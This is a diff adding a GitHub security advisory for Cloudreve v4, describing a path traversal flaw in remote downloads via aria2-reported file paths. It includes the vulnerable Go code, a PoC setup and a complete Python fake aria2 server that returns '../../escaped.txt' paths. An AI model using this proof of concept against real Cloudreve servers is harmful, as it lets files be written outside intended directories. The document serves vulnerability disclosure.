@@ -1,0 +1,42 @@
+{
+  "id": "GHSA-w8j7-39hp-8x59",
+  "modified": "2026-08-25T00:45:12.265819615Z",
+  "published": "2026-08-24T22:03:33Z",
+  "summary": "Cloudreve's remote download file paths can escape the selected destination directory",
+  "details": "### Summary\n\nCloudreve trusts file paths returned by the configured remote downloader. A downloader-reported path such as `../../escaped.txt` can cause a downloaded file to be created outside the user-selected destination directory.\n\n### Details\n\nIn the remote download master transfer path, Cloudreve joins the user-selected destination URI with the downloader-reported file name.\n\n```go\n// pkg/filemanager/workflows/remote_download.go:436-438\nsanitizedName := sanitizeFileName(file.Name)\ndst := dstUri.JoinRaw(sanitizedName)\nsrc := filepath.FromSlash(path.Join(m.state.Status.SavePath, file.Name))\n```\n\nThe same issue also exists when constructing slave upload payloads.\n\n```go\n// pkg/filemanager/workflows/remote_download.go:323-327\ndst := dstUri.JoinRaw(sanitizeFileName(f.Name))\nsrc := path.Join(m.state.Status.SavePath, f.Name)\npayload.Files = append(payload.Files, SlaveUploadEntity{\n\tSrc:   src,\n\tUri:   dst,\n```\n\nThe sanitizer does not remove `/`, `.`, or `..` path segments.\n\n```go\n// pkg/filemanager/workflows/remote_download.go:648-650\nfunc sanitizeFileName(name string) string {\n\tr := strings.NewReplacer(\"\\\\\", \"_\", \":\", \"_\", \"*\", \"_\", \"?\", \"_\", \"\\\"\", \"_\", \"\u003c\", \"_\", \"\u003e\", \"_\", \"|\", \"_\")\n\treturn r.Replace(name)\n}\n```\n\n`JoinRaw()` splits the raw string by `/` and joins the segments, allowing `..` to affect the final URI path.\n\n```go\n// pkg/filemanager/fs/uri.go:173-175\nfunc (u *URI) JoinRaw(elem string) *URI {\n\treturn u.Join(strings.Split(strings.TrimPrefix(elem, Separator), Separator)...)\n}\n```\n\nFor aria2, Cloudreve derives `downloader.TaskFile.Name` from the path returned by `aria2.tellStatus().files[].path`.\n\n```go\n// pkg/downloader/aria2/aria2.go:148-159\nrelPath := strings.TrimPrefix(filepath.ToSlash(item.Path), savePath)\nif len(relPath) \u003e 0 {\n\trelPath = relPath[1:]\n}\nreturn downloader.TaskFile{\n\tIndex:    index,\n\tName:     relPath,\n```\n\nTherefore, if the selected destination is: `cloudreve://my/victim/safe`, the downloader reports `../../escaped.txt`, the final upload destination becomes `cloudreve://my/escaped.txt`\n\nThe issue can move the final Cloudreve URI further up the user’s any accessible namespace, but is subject to Cloudreve’s normal permission and upload checks.\n\n### PoC\n\nThe PoC uses a fake aria2 JSON-RPC service to simulate a downloader returning a traversal path. The vulnerable input is downloader metadata returned by the downloader API, not the HTTP response body of the downloaded URL.\n\nSetup:\n\n```text\nCloudreve official Docker image\nPostgreSQL\nRedis\nFake aria2 JSON-RPC service\n```\n\nConfigure the master node in the Cloudreve admin UI:\n\n```text\nRemote download capability: enabled\nDownloader provider: aria2\naria2 RPC server: http://fake-aria2:6800/jsonrpc\naria2 token: empty\n```\n\nCreate this folder structure in the file manager:\n\n```text\nMy files /\n  victim /\n    safe /\n```\n\nCreate a remote download task using any URL in the `victim/safe` directory, for example:\n\n```text\nhttp://attacker.invalid/file\n```\n\nThe fake aria2 service returns:\n\n```text\nfiles[0].path = \u003csaveDir\u003e/../../escaped.txt\n```\n\nExpected result after the remote download task completes:\n\n```text\ncloudreve://my/escaped.txt exists\n```\n\nThis demonstrates that the downloaded file escapes both the selected destination directory and its parent directory.\n\n### Impact\n\nIf a configured remote downloader returns malicious file metadata, Cloudreve may create downloaded files outside the destination directory selected by the user who starts the remote download task.\n\nThis affects authenticated users who have remote-download permission and create remote download tasks. The resulting file is still subject to Cloudreve’s normal upload and permission checks, but it may be placed in an unexpected writable location outside the selected folder.\n\n### Appendix: fake_aria2.py\n\n```python\nimport json\nimport os\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nGID = \"0123456789abcdef\"\nCONTENT = b\"created outside the selected Cloudreve destination\\n\"\nsave_dir = \"/cloudreve/data/temp/aria2/poc-final\"\n\n\ndef write_source_file():\n    source = os.path.normpath(os.path.join(save_dir, \"..\", \"..\", \"escaped.txt\"))\n    os.makedirs(os.path.dirname(source), exist_ok=True)\n    with open(source, \"wb\") as f:\n        f.write(CONTENT)\n    print(f\"fake aria2 source file: {source}\", flush=True)\n\n\ndef response(rpc_id, result):\n    return json.dumps({\"jsonrpc\": \"2.0\", \"id\": rpc_id, \"result\": result}).encode()\n\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        global save_dir\n\n        raw = self.rfile.read(int(self.headers.get(\"Content-Length\", \"0\")))\n        req = json.loads(raw or b\"{}\")\n        method = req.get(\"method\")\n        rpc_id = req.get(\"id\")\n\n        if method == \"aria2.addUri\":\n            for item in req.get(\"params\", []):\n                if isinstance(item, dict) and item.get(\"dir\"):\n                    save_dir = item[\"dir\"]\n                    break\n            write_source_file()\n            result = GID\n        elif method == \"aria2.tellStatus\":\n            result = {\n                \"gid\": GID,\n                \"status\": \"complete\",\n                \"totalLength\": str(len(CONTENT)),\n                \"completedLength\": str(len(CONTENT)),\n                \"uploadLength\": \"0\",\n                \"downloadSpeed\": \"0\",\n                \"uploadSpeed\": \"0\",\n                \"infoHash\": \"\",\n                \"numPieces\": \"1\",\n                \"dir\": save_dir,\n                \"files\": [\n                    {\n                        \"index\": \"1\",\n                        \"path\": f\"{save_dir}/../../escaped.txt\",\n                        \"length\": str(len(CONTENT)),\n                        \"completedLength\": str(len(CONTENT)),\n                        \"selected\": \"true\",\n                        \"uris\": [],\n                    }\n                ],\n                \"bittorrent\": {\"mode\": \"single\", \"info\": {\"name\": \"poc-final\"}},\n            }\n        elif method == \"aria2.getVersion\":\n            result = {\"version\": \"fake-poc-final\", \"enabledFeatures\": []}\n        else:\n            result = \"OK\"\n\n        body = response(rpc_id, result)\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.send_header(\"Content-Length\", str(len(body)))\n        self.end_headers()\n        self.wfile.write(body)\n\n    def log_message(self, fmt, *args):\n        return\n\n\nif __name__ == \"__main__\":\n    print(\"fake aria2 JSON-RPC listening on :6800\", flush=True)\n    HTTPServer((\"0.0.0.0\", 6800), Handler).serve_forever()\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/cloudreve/Cloudreve/v4",
+        "purl": "pkg:golang/github.com/cloudreve/Cloudreve/v4"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "4.0.0-20260606032813-26b6b1044b02"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-w8j7-39hp-8x59/GHSA-w8j7-39hp-8x59.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/cloudreve/cloudreve/security/advisories/GHSA-w8j7-39hp-8x59"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/cloudreve/cloudreve"
+    }
+  ]
+}
